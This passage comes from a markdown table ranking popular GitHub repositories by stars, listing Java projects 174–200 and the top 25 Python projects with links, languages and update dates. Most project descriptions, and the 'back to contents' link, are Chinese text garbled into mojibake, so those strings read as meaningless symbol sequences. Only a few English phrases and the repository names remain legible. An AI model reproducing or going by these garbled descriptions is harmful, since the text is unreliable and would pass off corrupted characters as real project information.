|174|[JsonChao/Awesome-WanAndroid](https://github.com/JsonChao/Awesome-WanAndroid)|:zap:Ëá¥Âäõ‰∫éÊâìÈÄ†‰∏ÄÊ¨æÊûÅËá¥‰ΩìÈ™åÁöÑ http://www.wanandroid.com/ ÂÆ¢Êà∑Á´ØÔºåÁü•ËØÜÂíåÁæéÊòØÂèØ‰ª•Âπ∂Â≠òÁöÑÂì¶QAQn(*‚âß‚ñΩ‚â¶*)n|2.3k|Java|10/29|
|175|[zlt2000/microservices-platform](https://github.com/zlt2000/microservices-platform)|Âü∫‰∫éSpringBoot2.x„ÄÅSpringCloudÂíåSpringCloudAlibabaÂπ∂ÈááÁî®ÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰ºÅ‰∏öÁ∫ßÂæÆÊúçÂä°Â§öÁßüÊà∑Á≥ªÁªüÊû∂ÊûÑ„ÄÇÂπ∂ÂºïÂÖ•ÁªÑ‰ª∂ÂåñÁöÑÊÄùÊÉ≥ÂÆûÁé∞È´òÂÜÖËÅö‰ΩéËÄ¶ÂêàÔºåÈ°πÁõÆ‰ª£Á†ÅÁÆÄÊ¥ÅÊ≥®Èáä‰∏∞ÂØå‰∏äÊâãÂÆπÊòìÔºåÈÄÇÂêàÂ≠¶‰π†Âíå‰ºÅ‰∏ö‰∏≠‰ΩøÁî®„ÄÇÁúüÊ≠£ÂÆûÁé∞‰∫ÜÂü∫‰∫éRBAC„ÄÅjwtÂíåoauth2ÁöÑÊó†Áä∂ÊÄÅÁªü‰∏ÄÊùÉÈôêËÆ§ËØÅÁöÑËß£ÂÜ≥ÊñπÊ°àÔºåÈù¢Âêë‰∫íËÅîÁΩëËÆæËÆ°ÂêåÊó∂ÈÄÇÂêàBÁ´ØÂíåCÁ´ØÁî®Êà∑ÔºåÊîØÊåÅCI/CDÂ§öÁéØÂ¢ÉÈÉ®ÁΩ≤ÔºåÂπ∂Êèê‰æõÂ∫îÁî®ÁÆ°ÁêÜÊñπ‰æøÁ¨¨‰∏âÊñπÁ≥ªÁªüÊé•ÂÖ•ÔºõÂêåÊó∂ËøòÈõÜÂêàÂêÑÁßçÂæÆÊúçÂä°Ê≤ªÁêÜÂäüËÉΩÂíåÁõëÊéßÂäüËÉΩ„ÄÇÊ®°ÂùóÂåÖÊã¨:‰ºÅ‰∏öÁ∫ßÁöÑËÆ§ËØÅÁ≥ªÁªü„ÄÅÂºÄÂèëÂπ≥Âè∞„ÄÅÂ∫îÁî®ÁõëÊéß„ÄÅÊÖ¢sqlÁõëÊéß„ÄÅÁªü‰∏ÄÊó•Âøó„ÄÅÂçïÁÇπÁôªÂΩï„ÄÅRedisÂàÜÂ∏ÉÂºèÈ´òÈÄüÁºìÂ≠ò„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÂàÜÂ∏ÉÂºè‰ªªÂä°Ë∞ÉÂ∫¶„ÄÅÊé•Âè£ÊñáÊ°£„ÄÅ‰ª£Á†ÅÁîüÊàêÁ≠âÁ≠â„ÄÇ|2.2k|Java|10/13|
|176|[liyiorg/weixin-popular](https://github.com/liyiorg/weixin-popular)|ÂæÆ‰ø°SDK  JAVA  (ÂÖ¨‰ºóÂπ≥Âè∞„ÄÅÂºÄÊîæÂπ≥Âè∞„ÄÅ ÂïÜÊà∑Âπ≥Âè∞„ÄÅ ÊúçÂä°ÂïÜÂπ≥Âè∞)|2.2k|Java|08/25|
|177|[svga/SVGAPlayer-Android](https://github.com/svga/SVGAPlayer-Android)|Similar to Lottie. Render After Effects / Animate CC (Flash) animations natively on Android and iOS, Web.  ‰ΩøÁî® SVGAPlayer Âú® Android„ÄÅiOS„ÄÅWeb‰∏≠Êí≠Êîæ After Effects / Animate CC (Flash) Âä®Áîª„ÄÇ|2.2k|Java|10/09|
|178|[qunarcorp/qmq](https://github.com/qunarcorp/qmq)| QMQÊòØÂéªÂì™ÂÑøÁΩëÂÜÖÈÉ®ÂπøÊ≥õ‰ΩøÁî®ÁöÑÊ∂àÊÅØ‰∏≠Èó¥‰ª∂ÔºåËá™2012Âπ¥ËØûÁîü‰ª•Êù•Âú®ÂéªÂì™ÂÑøÁΩëÊâÄÊúâ‰∏öÂä°Âú∫ÊôØ‰∏≠ÂπøÊ≥õÁöÑÂ∫îÁî®ÔºåÂåÖÊã¨Ë∑ü‰∫§ÊòìÊÅØÊÅØÁõ∏ÂÖ≥ÁöÑËÆ¢ÂçïÂú∫ÊôØÔºõ ‰πüÂåÖÊã¨Êä•‰ª∑ÊêúÁ¥¢Á≠âÈ´òÂêûÂêêÈáèÂú∫ÊôØ„ÄÇ|2.2k|Java|10/27|
|179|[QNJR-GROUP/EasyTransaction](https://github.com/QNJR-GROUP/EasyTransaction)|A distribute transaction solutionÔºàÂàÜÂ∏ÉÂºè‰∫ãÂä°Ôºâ unified the usage of TCC , SAGA ,FMT (seata/fescar AutoCompensation)Ôºå reliable message, compensate and so on;|2.2k|Java|09/22|
|180|[JPressProjects/jpress](https://github.com/JPressProjects/jpress)|JPressÔºå‰∏Ä‰∏™‰ΩøÁî® Java ÂºÄÂèëÁöÑÂª∫Á´ôÁ•ûÂô®ÔºåÁõÆÂâçÂ∑≤ÁªèÊúâ 10w+ ÁΩëÁ´ô‰ΩøÁî® JPress ËøõË°åÈ©±Âä®ÔºåÂÖ∂‰∏≠ÂåÖÊã¨Â§ö‰∏™ÊîøÂ∫úÊú∫ÊûÑÔºå200+‰∏äÂ∏ÇÂÖ¨Âè∏Ôºå‰∏≠ÁßëÈô¢„ÄÅÁ∫¢+Â≠ó‰ºöÁ≠â„ÄÇ|2.2k|Java|10/19|
|181|[mqzhangw/JIMU](https://github.com/mqzhangw/JIMU)|‰∏ÄÁßçÁÆÄÂçïÊúâÊïàÁöÑandroidÁªÑ‰ª∂ÂåñÊñπÊ°àÔºåÊîØÊåÅÁªÑ‰ª∂ÁöÑ‰ª£Á†ÅËµÑÊ∫êÈöîÁ¶ª„ÄÅÂçïÁã¨Ë∞ÉËØï„ÄÅÈõÜÊàêË∞ÉËØï„ÄÅÁªÑ‰ª∂‰∫§‰∫í„ÄÅUIË∑≥ËΩ¨„ÄÅÁîüÂëΩÂë®ÊúüÁ≠âÂÆåÊï¥ÂäüËÉΩ„ÄÇ|2.1k|Java|10/17|
|182|[BeesX/BeesAndroid](https://github.com/BeesX/BeesAndroid)|AndroidÁ≥ªÁªüÊ∫êÁ†ÅÂàÜÊûêÈáçÊûÑ‰∏≠|2.1k|Java|07/10|
|183|[xubinux/xbin-store](https://github.com/xubinux/xbin-store)|Ê®°‰ªøÂõΩÂÜÖÁü•ÂêçB2CÁΩëÁ´ô,ÂÆûÁé∞ÁöÑ‰∏Ä‰∏™ÂàÜÂ∏ÉÂºèB2CÂïÜÂüé ‰ΩøÁî®Spring Boot Ëá™Âä®ÈÖçÁΩÆ Dubbox / MVC / MyBatis / Druid / Solr / Redis Á≠â„ÄÇ‰ΩøÁî®Spring CloudÁâàÊú¨ËØ∑Êü•Áúã|2.1k|Java|10/13|
|184|[l123456789jy/Lazy](https://github.com/l123456789jy/Lazy)|The android tools           Ëá™Â∑±Êï¥ÁêÜÁöÑÂ∏∏Áî®ÁöÑÂ∑•ÂÖ∑Á±ª   |2.1k|Java|08/28|
|185|[xtuhcy/gecco](https://github.com/xtuhcy/gecco)|Easy to use lightweight web crawlerÔºàÊòìÁî®ÁöÑËΩªÈáèÂåñÁΩëÁªúÁà¨Ëô´Ôºâ|2.1k|Java|07/23|
|186|[rememberber/WePush](https://github.com/rememberber/WePush)|‰∏ìÊ≥®ÊâπÈáèÊé®ÈÄÅÁöÑÂ∞èËÄåÁæéÁöÑÂ∑•ÂÖ∑ÔºåÁõÆÂâçÊîØÊåÅÔºöÊ®°ÊùøÊ∂àÊÅØ-ÂÖ¨‰ºóÂè∑„ÄÅÊ®°ÊùøÊ∂àÊÅØ-Â∞èÁ®ãÂ∫è„ÄÅÂæÆ‰ø°ÂÆ¢ÊúçÊ∂àÊÅØ„ÄÅÂæÆ‰ø°‰ºÅ‰∏öÂè∑/‰ºÅ‰∏öÂæÆ‰ø°Ê∂àÊÅØ„ÄÅÈòøÈáå‰∫ëÁü≠‰ø°„ÄÅÈòøÈáåÂ§ß‰∫éÊ®°ÊùøÁü≠‰ø° „ÄÅËÖæËÆØ‰∫ëÁü≠‰ø°„ÄÅ‰∫ëÁâáÁΩëÁü≠‰ø°„ÄÅE-Mail„ÄÅHTTPËØ∑Ê±Ç„ÄÅÈíâÈíâ„ÄÅÂçé‰∏∫‰∫ëÁü≠‰ø°„ÄÅÁôæÂ∫¶‰∫ëÁü≠‰ø°„ÄÅÂèàÊãç‰∫ëÁü≠‰ø°„ÄÅ‰∏ÉÁâõ‰∫ëÁü≠‰ø°|2.0k|Java|10/22|
|187|[xiaojinzi123/Component](https://github.com/xiaojinzi123/Component)|üî•üî•üî•A powerful componentized framework.‰∏Ä‰∏™Âº∫Â§ß„ÄÅ100% ÂÖºÂÆπ„ÄÅÊîØÊåÅ AndroidX„ÄÅÊîØÊåÅ KotlinÂπ∂‰∏îÁÅµÊ¥ªÁöÑÁªÑ‰ª∂ÂåñÊ°ÜÊû∂|2.0k|Java|10/26|
|188|[jianjunxiao/NiceVieoPlayer](https://github.com/jianjunxiao/NiceVieoPlayer)|IjkPlayer/MediaPlayer+TextureViewÔºåÊîØÊåÅÂàóË°®ÔºåÂÆåÁæéÂàáÊç¢ÂÖ®Â±è„ÄÅÂ∞èÁ™óÂè£ÁöÑAndroidËßÜÈ¢ëÊí≠ÊîæÂô® |2.0k|Java|02/04|
|189|[ngbdf/redis-manager](https://github.com/ngbdf/redis-manager)|Redis ‰∏ÄÁ´ôÂºèÁÆ°ÁêÜÂπ≥Âè∞ÔºåÊîØÊåÅÈõÜÁæ§ÁöÑÁõëÊéß„ÄÅÂÆâË£Ö„ÄÅÁÆ°ÁêÜ„ÄÅÂëäË≠¶‰ª•ÂèäÂü∫Êú¨ÁöÑÊï∞ÊçÆÊìç‰Ωú|2.0k|Java|10/14|
|190|[tianshiyeben/wgcloud](https://github.com/tianshiyeben/wgcloud)|linuxËøêÁª¥ÁõëÊéßÂ∑•ÂÖ∑|2.0k|Java|10/26|
|191|[CheckChe0803/flink-recommandSystem-demo](https://github.com/CheckChe0803/flink-recommandSystem-demo)|:helicopter::rocket:Âü∫‰∫éFlinkÂÆûÁé∞ÁöÑÂïÜÂìÅÂÆûÊó∂Êé®ËçêÁ≥ªÁªü„ÄÇflinkÁªüËÆ°ÂïÜÂìÅÁÉ≠Â∫¶ÔºåÊîæÂÖ•redisÁºìÂ≠òÔºåÂàÜÊûêÊó•Âøó‰ø°ÊÅØÔºåÂ∞ÜÁîªÂÉèÊ†áÁ≠æÂíåÂÆûÊó∂ËÆ∞ÂΩïÊîæÂÖ•Hbase„ÄÇÂú®Áî®Êà∑ÂèëËµ∑Êé®ËçêËØ∑Ê±ÇÂêéÔºåÊ†πÊçÆÁî®Êà∑ÁîªÂÉèÈáçÊéíÂ∫èÁÉ≠Â∫¶Ê¶úÔºåÂπ∂ÁªìÂêàÂçèÂêåËøáÊª§ÂíåÊ†áÁ≠æ‰∏§‰∏™Êé®ËçêÊ®°Âùó‰∏∫Êñ∞ÁîüÊàêÁöÑÊ¶úÂçïÁöÑÊØè‰∏Ä‰∏™‰∫ßÂìÅÊ∑ªÂä†ÂÖ≥ËÅî‰∫ßÂìÅÔºåÊúÄÂêéËøîÂõûÊñ∞ÁöÑÁî®Êà∑ÂàóË°®„ÄÇ|2.0k|Java|07/02|
|192|[baomidou/dynamic-datasource-spring-boot-starter](https://github.com/baomidou/dynamic-datasource-spring-boot-starter)|dynamic datasource for springboot Â§öÊï∞ÊçÆÊ∫ê Âä®ÊÄÅÊï∞ÊçÆÊ∫ê ‰∏ª‰ªéÂàÜÁ¶ª ËØªÂÜôÂàÜÁ¶ª ÂàÜÂ∏ÉÂºè‰∫ãÂä° https://dynamic-datasource.github.io/dynamic-datasource-doc/|2.0k|Java|10/06|
|193|[vivian8725118/TimeLine](https://github.com/vivian8725118/TimeLine)|ÁÄëÂ∏ÉÊµÅÂºèÁöÑÊó∂Èó¥ËΩ¥|2.0k|Java|09/01|
|194|[EhsanTang/ApiManager](https://github.com/EhsanTang/ApiManager)|CRAP - ÂºÄÊ∫êAPIÊé•Âè£ÁÆ°ÁêÜÂπ≥Âè∞   ÂÆåÂÖ®ÂºÄÊ∫ê„ÄÅÂÖçË¥π‰ΩøÁî®ÁöÑAPIÊé•Âè£ÁÆ°ÁêÜÁ≥ªÁªü„ÄÅBUGÁÆ°ÁêÜÁ≥ªÁªüÔºöAPIÊé•Âè£ÁÆ°ÁêÜ„ÄÅÊñáÊ°£ÁÆ°ÁêÜ„ÄÅÊï∞ÊçÆÂ∫ìË°®ÁÆ°ÁêÜ„ÄÅÊé•Âè£Ë∞ÉËØï„ÄÅÊµèËßàÂô®Ë∞ÉËØïÊèí‰ª∂„ÄÅÂØºÂá∫word&pdfÊé•Âè£‚Ä¶..ÔºåÈááÁî®SpringMVC + MyBatis + Lucene + Bootstrap + Angularjs + Iconfont + Guava Cache ÔºåÁ∫ø‰∏ä‰ΩøÁî®Âú∞ÂùÄÔºöhttp://api.crap.cn|1.9k|Java|10/13|
|195|[zhaojun1998/zfile](https://github.com/zhaojun1998/zfile)|Âú®Á∫ø‰∫ëÁõò„ÄÅÁΩëÁõò„ÄÅOneDrive„ÄÅ‰∫ëÂ≠òÂÇ®„ÄÅÁßÅÊúâ‰∫ë„ÄÅÂØπË±°Â≠òÂÇ®„ÄÅh5ai|1.9k|Java|10/07|
|196|[alibaba/yugong](https://github.com/alibaba/yugong)|ÈòøÈáåÂ∑¥Â∑¥ÂéªOracleÊï∞ÊçÆËøÅÁßªÂêåÊ≠•Â∑•ÂÖ∑(ÂÖ®Èáè+Â¢ûÈáè,ÁõÆÊ†áÊîØÊåÅMySQL/DRDS)|1.9k|Java|10/13|
|197|[zhangdaiscott/jeecg](https://github.com/zhangdaiscott/jeecg)|JEECGÊòØ‰∏ÄÊ¨æÂü∫‰∫é‰ª£Á†ÅÁîüÊàêÂô®ÁöÑJ2EEÂø´ÈÄüÂºÄÂèëÂπ≥Âè∞ÔºåÂºÄÊ∫êÁïå‚ÄúÂ∞èÊôÆÂÖÉ‚ÄùË∂ÖË∂ä‰º†ÁªüÂïÜ‰∏ö‰ºÅ‰∏öÁ∫ßÂºÄÂèëÂπ≥Âè∞„ÄÇÂºïÈ¢ÜÊñ∞ÁöÑÂºÄÂèëÊ®°Âºè(Online CodingÊ®°Âºè(Ëá™ÂÆö‰πâË°®Âçï) - > ‰ª£Á†ÅÁîüÊàêÂô®Ê®°Âºè - > ÊâãÂ∑•MERGEÊô∫ËÉΩÂºÄÂèë)Ôºå ÂèØ‰ª•Â∏ÆÂä©Ëß£ÂÜ≥JavaÈ°πÁõÆ90%ÁöÑÈáçÂ§çÂ∑•‰ΩúÔºåËÆ©ÂºÄÂèëÊõ¥Â§öÂÖ≥Ê≥®‰∏öÂä°ÈÄªËæë„ÄÇÊó¢ËÉΩÂø´ÈÄüÊèêÈ´òÂºÄÂèëÊïàÁéáÔºåÂ∏ÆÂä©ÂÖ¨Âè∏ËäÇÁúÅ‰∫∫ÂäõÊàêÊú¨ÔºåÂêåÊó∂Âèà‰∏çÂ§±ÁÅµÊ¥ªÊÄß„ÄÇÂÖ∑Â§áÔºöË°®ÂçïÈÖçÁΩÆËÉΩÂäõÔºàÊó†ÈúÄÁºñÁ†ÅÔºâ„ÄÅÁßªÂä®ÈÖçÁΩÆËÉΩÂäõ„ÄÅÂ∑•‰ΩúÊµÅÈÖçÁΩÆËÉΩÂäõ„ÄÅÊä•Ë°®ÈÖçÁΩÆËÉΩÂäõÔºàÊîØÊåÅÁßªÂä®Á´ØÔºâ„ÄÅÊèí‰ª∂ÂºÄÂèëËÉΩÂäõÔºàÂèØÊèíÊãîÔºâ|1.9k|Java|10/13|
|198|[forezp/SpringBootLearning](https://github.com/forezp/SpringBootLearning)|„ÄäSpring BootÊïôÁ®ã„ÄãÊ∫êÁ†Å|1.9k|Java|07/02|
|199|[SpringForAll/spring-boot-starter-swagger](https://github.com/SpringForAll/spring-boot-starter-swagger)|Ëá™Âà∂spring boot starter for swagger 2.xÔºåÊù•ËØïËØïÂêßÔºåÂæàÂ•ΩÁî®Âì¶~|1.9k|Java|10/23|
|200|[HpWens/MeiWidgetView](https://github.com/HpWens/MeiWidgetView)|üî•‰∏ÄÊ¨æÊ±áÊÄª‰∫ÜÈÉ≠ÈúñÔºåÈ∏øÊ¥ãÔºå‰ª•ÂèäËá™Â∑±Âπ≥Êó∂Êî∂ÈõÜÁöÑËá™ÂÆö‰πâÊéß‰ª∂ÈõÜÂêàÂ∫ìÔºàÂ∞èÁ∫¢‰π¶Ôºâ|1.9k|Java|04/26|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## Python

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[jackfrued/Python-100-Days](https://github.com/jackfrued/Python-100-Days)|Python - 100Â§©‰ªéÊñ∞ÊâãÂà∞Â§ßÂ∏à|94.7k|Python|10/22|
|2|[521xueweihan/HelloGitHub](https://github.com/521xueweihan/HelloGitHub)|:octocat: Find pearls on open-source seashore ÂàÜ‰∫´ GitHub ‰∏äÊúâË∂£„ÄÅÂÖ•Èó®Á∫ßÁöÑÂºÄÊ∫êÈ°πÁõÆ|34.4k|Python|10/28|
|3|[0voice/interview_internal_reference](https://github.com/0voice/interview_internal_reference)|2020Âπ¥ÊúÄÊñ∞ÊÄªÁªìÔºåÈòøÈáåÔºåËÖæËÆØÔºåÁôæÂ∫¶ÔºåÁæéÂõ¢ÔºåÂ§¥Êù°Á≠âÊäÄÊúØÈù¢ËØïÈ¢òÁõÆÔºå‰ª•ÂèäÁ≠îÊ°àÔºå‰∏ìÂÆ∂Âá∫È¢ò‰∫∫ÂàÜÊûêÊ±áÊÄª„ÄÇ|29.2k|Python|10/17|
|4|[testerSunshine/12306](https://github.com/testerSunshine/12306)|12306Êô∫ËÉΩÂà∑Á•®ÔºåËÆ¢Á•®|28.8k|Python|09/26|
|5|[apachecn/AiLearning](https://github.com/apachecn/AiLearning)|AiLearning: Êú∫Âô®Â≠¶‰π† - MachineLearning - ML„ÄÅÊ∑±Â∫¶Â≠¶‰π† - DeepLearning - DL„ÄÅËá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ NLP|27.6k|Python|10/27|
|6|[fighting41love/funNLP](https://github.com/fighting41love/funNLP)|‰∏≠Ëã±ÊñáÊïèÊÑüËØç„ÄÅËØ≠Ë®ÄÊ£ÄÊµã„ÄÅ‰∏≠Â§ñÊâãÊú∫/ÁîµËØùÂΩíÂ±ûÂú∞/ËøêËê•ÂïÜÊü•ËØ¢„ÄÅÂêçÂ≠óÊé®Êñ≠ÊÄßÂà´„ÄÅÊâãÊú∫Âè∑ÊäΩÂèñ„ÄÅË∫´‰ªΩËØÅÊäΩÂèñ„ÄÅÈÇÆÁÆ±ÊäΩÂèñ„ÄÅ‰∏≠Êó•Êñá‰∫∫ÂêçÂ∫ì„ÄÅ‰∏≠ÊñáÁº©ÂÜôÂ∫ì„ÄÅÊãÜÂ≠óËØçÂÖ∏„ÄÅËØçÊ±áÊÉÖÊÑüÂÄº„ÄÅÂÅúÁî®ËØç„ÄÅÂèçÂä®ËØçË°®„ÄÅÊö¥ÊÅêËØçË°®„ÄÅÁπÅÁÆÄ‰ΩìËΩ¨Êç¢„ÄÅËã±ÊñáÊ®°Êãü‰∏≠ÊñáÂèëÈü≥„ÄÅÊ±™Â≥∞Ê≠åËØçÁîüÊàêÂô®„ÄÅËÅå‰∏öÂêçÁß∞ËØçÂ∫ì„ÄÅÂêå‰πâËØçÂ∫ì„ÄÅÂèç‰πâËØçÂ∫ì„ÄÅÂê¶ÂÆöËØçÂ∫ì„ÄÅÊ±ΩËΩ¶ÂìÅÁâåËØçÂ∫ì„ÄÅÊ±ΩËΩ¶Èõ∂‰ª∂ËØçÂ∫ì„ÄÅËøûÁª≠Ëã±ÊñáÂàáÂâ≤„ÄÅÂêÑÁßç‰∏≠ÊñáËØçÂêëÈáè„ÄÅÂÖ¨Âè∏ÂêçÂ≠óÂ§ßÂÖ®„ÄÅÂè§ËØóËØçÂ∫ì„ÄÅITËØçÂ∫ì„ÄÅË¥¢ÁªèËØçÂ∫ì„ÄÅÊàêËØ≠ËØçÂ∫ì„ÄÅÂú∞ÂêçËØçÂ∫ì„ÄÅÂéÜÂè≤Âêç‰∫∫ËØçÂ∫ì„ÄÅËØóËØçËØçÂ∫ì„ÄÅÂåªÂ≠¶ËØçÂ∫ì„ÄÅÈ•ÆÈ£üËØçÂ∫ì„ÄÅÊ≥ïÂæãËØçÂ∫ì„ÄÅÊ±ΩËΩ¶ËØçÂ∫ì„ÄÅÂä®Áâ©ËØçÂ∫ì„ÄÅ‰∏≠ÊñáËÅäÂ§©ËØ≠Êñô„ÄÅ‰∏≠ÊñáË∞£Ë®ÄÊï∞ÊçÆ„ÄÅÁôæÂ∫¶‰∏≠ÊñáÈóÆÁ≠îÊï∞ÊçÆÈõÜ„ÄÅÂè•Â≠êÁõ∏‰ººÂ∫¶ÂåπÈÖçÁÆóÊ≥ïÈõÜÂêà„ÄÅbertËµÑÊ∫ê„ÄÅÊñáÊú¨ÁîüÊàê&ÊëòË¶ÅÁõ∏ÂÖ≥Â∑•ÂÖ∑„ÄÅcocoNLP‰ø°ÊÅØÊäΩÂèñ ...|25.6k|Python|10/02|
|7|[fxsjy/jieba](https://github.com/fxsjy/jieba)|ÁªìÂ∑¥‰∏≠ÊñáÂàÜËØç|24.5k|Python|07/24|
|8|[hankcs/HanLP](https://github.com/hankcs/HanLP)|‰∏≠ÊñáÂàÜËØç ËØçÊÄßÊ†áÊ≥® ÂëΩÂêçÂÆû‰ΩìËØÜÂà´ ‰æùÂ≠òÂè•Ê≥ïÂàÜÊûê ËØ≠‰πâ‰æùÂ≠òÂàÜÊûê Êñ∞ËØçÂèëÁé∞ ÂÖ≥ÈîÆËØçÁü≠ËØ≠ÊèêÂèñ Ëá™Âä®ÊëòË¶Å ÊñáÊú¨ÂàÜÁ±ªËÅöÁ±ª ÊãºÈü≥ÁÆÄÁπÅËΩ¨Êç¢ Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ|21.1k|Python|10/29|
|9|[littlecodersh/ItChat](https://github.com/littlecodersh/ItChat)|A complete and graceful API for Wechat. ÂæÆ‰ø°‰∏™‰∫∫Âè∑Êé•Âè£„ÄÅÂæÆ‰ø°Êú∫Âô®‰∫∫ÂèäÂëΩ‰ª§Ë°åÂæÆ‰ø°Ôºå‰∏âÂçÅË°åÂç≥ÂèØËá™ÂÆö‰πâ‰∏™‰∫∫Âè∑Êú∫Âô®‰∫∫„ÄÇ|20.9k|Python|10/28|
|10|[d2l-ai/d2l-zh](https://github.com/d2l-ai/d2l-zh)|„ÄäÂä®ÊâãÂ≠¶Ê∑±Â∫¶Â≠¶‰π†„ÄãÔºöÈù¢Âêë‰∏≠ÊñáËØªËÄÖ„ÄÅËÉΩËøêË°å„ÄÅÂèØËÆ®ËÆ∫„ÄÇËã±ÊñáÁâàÂç≥‰ºØÂÖãÂà©‚ÄúÊ∑±Â∫¶Â≠¶‰π†ÂØºËÆ∫‚ÄùÊïôÊùê„ÄÇ|19.0k|Python|10/29|
|11|[wangzheng0822/algo](https://github.com/wangzheng0822/algo)|Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ïÂøÖÁü•ÂøÖ‰ºöÁöÑ50‰∏™‰ª£Á†ÅÂÆûÁé∞|16.9k|Python|10/29|
|12|[jumpserver/jumpserver](https://github.com/jumpserver/jumpserver)|JumpServer ÊòØÂÖ®ÁêÉÈ¶ñÊ¨æÂºÄÊ∫êÁöÑÂ†°ÂûíÊú∫ÔºåÊòØÁ¨¶Âêà 4A ÁöÑ‰∏ì‰∏öËøêÁª¥ÂÆâÂÖ®ÂÆ°ËÆ°Á≥ªÁªü„ÄÇ|14.2k|Python|10/29|
|13|[wangshub/wechat_jump_game](https://github.com/wangshub/wechat_jump_game)|ÂæÆ‰ø°„ÄäË∑≥‰∏ÄË∑≥„ÄãPython ËæÖÂä©|13.9k|Python|10/10|
|14|[PaddlePaddle/Paddle](https://github.com/PaddlePaddle/Paddle)|PArallel Distributed Deep LEarning: Machine Learning Framework from Industrial Practice Ôºà„ÄéÈ£ûÊ°®„ÄèÊ†∏ÂøÉÊ°ÜÊû∂ÔºåÊ∑±Â∫¶Â≠¶‰π†&Êú∫Âô®Â≠¶‰π†È´òÊÄßËÉΩÂçïÊú∫„ÄÅÂàÜÂ∏ÉÂºèËÆ≠ÁªÉÂíåË∑®Âπ≥Âè∞ÈÉ®ÁΩ≤Ôºâ|13.2k|Python|10/30|
|15|[Kr1s77/awesome-python-login-model](https://github.com/Kr1s77/awesome-python-login-model)|üòÆpythonÊ®°ÊãüÁôªÈôÜ‰∏Ä‰∫õÂ§ßÂûãÁΩëÁ´ôÔºåËøòÊúâ‰∏Ä‰∫õÁÆÄÂçïÁöÑÁà¨Ëô´ÔºåÂ∏åÊúõÂØπ‰Ω†‰ª¨ÊúâÊâÄÂ∏ÆÂä©‚ù§Ô∏èÔºåÂ¶ÇÊûúÂñúÊ¨¢ËÆ∞ÂæóÁªô‰∏™starÂì¶üåü|12.4k|Python|10/02|
|16|[shimohq/chinese-programmer-wrong-pronunciation](https://github.com/shimohq/chinese-programmer-wrong-pronunciation)|‰∏≠ÂõΩÁ®ãÂ∫èÂëòÂÆπÊòìÂèëÈü≥ÈîôËØØÁöÑÂçïËØç|12.1k|Python|10/08|
|17|[Jack-Cherish/python-spider](https://github.com/Jack-Cherish/python-spider)|:rainbow:Python3ÁΩëÁªúÁà¨Ëô´ÂÆûÊàòÔºöÊ∑òÂÆù„ÄÅ‰∫¨‰∏ú„ÄÅÁΩëÊòì‰∫ë„ÄÅBÁ´ô„ÄÅ12306„ÄÅÊäñÈü≥„ÄÅÁ¨îË∂£ÈòÅ„ÄÅÊº´ÁîªÂ∞èËØ¥‰∏ãËΩΩ„ÄÅÈü≥‰πêÁîµÂΩ±‰∏ãËΩΩÁ≠â|11.6k|Python|09/25|
|18|[pjialin/py12306](https://github.com/pjialin/py12306)|üöÇ 12306 Ë¥≠Á•®Âä©ÊâãÔºåÊîØÊåÅÈõÜÁæ§ÔºåÂ§öË¥¶Âè∑ÔºåÂ§ö‰ªªÂä°Ë¥≠Á•®‰ª•Âèä Web È°µÈù¢ÁÆ°ÁêÜ |11.2k|Python|04/08|
|19|[jhao104/proxy_pool](https://github.com/jhao104/proxy_pool)|PythonÁà¨Ëô´‰ª£ÁêÜIPÊ±†(proxy pool)|10.9k|Python|10/26|
|20|[leisurelicht/wtfpython-cn](https://github.com/leisurelicht/wtfpython-cn)|wtfpythonÁöÑ‰∏≠ÊñáÁøªËØë/ÊñΩÂ∑•ÁªìÊùü/ ËÉΩÂäõÊúâÈôêÔºåÊ¨¢ËøéÂ∏ÆÊàëÊîπËøõÁøªËØë|10.8k|Python|06/13|
|21|[meolu/walle-web](https://github.com/meolu/walle-web)|walle - Áì¶Âäõ DevopsÂºÄÊ∫êÈ°πÁõÆ‰ª£Á†ÅÈÉ®ÁΩ≤Âπ≥Âè∞|10.5k|Python|08/20|
|22|[h2y/Shadowrocket-ADBlock-Rules](https://github.com/h2y/Shadowrocket-ADBlock-Rules)|Êèê‰æõÂ§öÊ¨æ Shadowrocket ËßÑÂàôÔºåÂ∏¶ÂπøÂëäËøáÊª§ÂäüËÉΩ„ÄÇÁî®‰∫é iOS Êú™Ë∂äÁã±ËÆæÂ§áÈÄâÊã©ÊÄßÂú∞Ëá™Âä®ÁøªÂ¢ô„ÄÇ|9.7k|Python|10/29|
|23|[shengqiangzhang/examples-of-web-crawlers](https://github.com/shengqiangzhang/examples-of-web-crawlers)|‰∏Ä‰∫õÈùûÂ∏∏ÊúâË∂£ÁöÑpythonÁà¨Ëô´‰æãÂ≠ê,ÂØπÊñ∞ÊâãÊØîËæÉÂèãÂ•Ω,‰∏ªË¶ÅÁà¨ÂèñÊ∑òÂÆù„ÄÅÂ§©Áå´„ÄÅÂæÆ‰ø°„ÄÅË±ÜÁì£„ÄÅQQÁ≠âÁΩëÁ´ô„ÄÇ(Some interesting examples of python crawlers that are friendly to beginners. )|9.2k|Python|05/15|
|24|[darknessomi/musicbox](https://github.com/darknessomi/musicbox)|ÁΩëÊòì‰∫ëÈü≥‰πêÂëΩ‰ª§Ë°åÁâàÊú¨|8.6k|Python|10/23|
|25|[Embedding/Chinese-Word-Vectors](https://github.com/Embedding/Chinese-Word-Vectors)|100+ Chinese Word Vectors ‰∏äÁôæÁßçÈ¢ÑËÆ≠ÁªÉ‰∏≠ÊñáËØçÂêëÈáè |8.0k|Python|08/24|
